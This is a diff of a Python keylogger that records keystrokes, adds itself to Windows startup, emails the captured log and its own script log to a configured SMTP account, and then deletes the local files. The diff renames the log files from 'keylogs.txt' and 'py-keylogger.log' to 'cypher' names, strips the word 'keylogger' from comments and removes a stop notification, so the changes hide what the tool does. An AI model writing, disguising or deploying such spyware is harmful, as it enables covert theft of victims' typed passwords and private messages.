@@ -8,24 +8,23 @@ import os
 import os.path
 import shutil
 try:
-    from pynput.keyboard import Key, Listener
-    pynput_installed = True
-except ModuleNotFoundError:
-    pynput_installed = False
-try:
     import win32console, win32gui
     win32_installed = True
 except ModuleNotFoundError:
     win32_installed = False
+try:
+    from pynput.keyboard import Key, Listener
+    pynput_installed = True
+except ModuleNotFoundError:
+    pynput_installed = False
 from datetime import datetime
 from os.path import basename, exists
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 
-
 LOG_FORMAT = "%(levelname)s %(asctime)s %(message)s"
-logging.basicConfig(filename = "py-keylogger.log", level = logging.INFO,
+logging.basicConfig(filename = "cypher.log", level = logging.INFO,
                     format = LOG_FORMAT, filemode = "w")
 logger = logging.getLogger()
 
@@ -57,15 +56,15 @@ Sent from {}.'''.format(PUBLIC_IP)
 active_keys = set()
 keys_pressed = 0
 
-# Record keystrokes in keylogs.txt
+# Record keystrokes in cypherlogs.txt
 def log(text):
-    with open("keylogs.txt", "a") as f:
+    with open("cypherlogs.txt", "a") as f:
         f.write(str(text))
         f.close()
 
 # Add to system starup
 def add_startup():
-    # Get keylogger.py file path
+    # Get file path
     abs_path = sys.argv[0].split("\\")[-1]
     file_name = basename(abs_path)
     curr_dir = os.getcwd()
@@ -82,7 +81,7 @@ def add_startup():
     startup_file.close()
     shutil.move(curr_dir + "\\start.cmd", startup)
         
-# Send email with keylogs.txt attached
+# Send email with cypherlogs.txt attached
 def send_email():
     # Set messgae header and body
     msg = MIMEMultipart()
@@ -93,21 +92,21 @@ def send_email():
     msg.attach(body)
     logger.info("Email header and body constructed")
     
-    # Attach keylogs.txt to email
-    key_log = "keylogs.txt"
+    # Attach cypherlogs.txt to email
+    key_log = "cypherlogs.txt"
     with open(key_log, "r") as f:
         attachment1 = MIMEApplication(f.read(), Name = basename(key_log))
         attachment1["Content-Disposition"] = "attachment"; key_log = f"{basename(key_log)}"
     msg.attach(attachment1)
-    logger.info("\"keylogs.txt\" attached to email")
+    logger.info("\"cypherlogs.txt\" attached to email")
     
-    # Attach py-keylogger.log to email
-    script_log = "py-keylogger.log"
+    # Attach cypher.log to email
+    script_log = "cypher.log"
     with open(script_log, "r") as f:
         attachment2 = MIMEApplication(f.read(), Name = basename(script_log))
         attachment2["Content-Disposition"] = "attachment"; script_log = f"{basename(script_log)}"
     msg.attach(attachment2)
-    logger.info("\"py-keylogger.log\" attached to email")
+    logger.info("\"cypher.log\" attached to email")
     
     # Connect to SMTP server and send message
     server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)
@@ -189,9 +188,6 @@ log("-----------------------------\n")
 log(f"End Time: {end_date.hour}:{end_minute} {end_date.month}/{end_date.day}/{end_date.year}\n")
 log("-----------------------------\n")
 
-'''Windows 10 notification when keylogger is stopped.'''
-# ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)
-
 # Send email once log is closed
 if internet_conn:
     send_email()
@@ -202,8 +198,8 @@ if internet_conn:
         logger.removeHandler(handler)
         handler.close()
         
-    os.remove("keylogs.txt")
-    os.remove("py-keylogger.log")
+    os.remove("cypherlogs.txt")
+    os.remove("cypher.log")
     
 else:
     logger.warning("Could not connect to the internet. " \
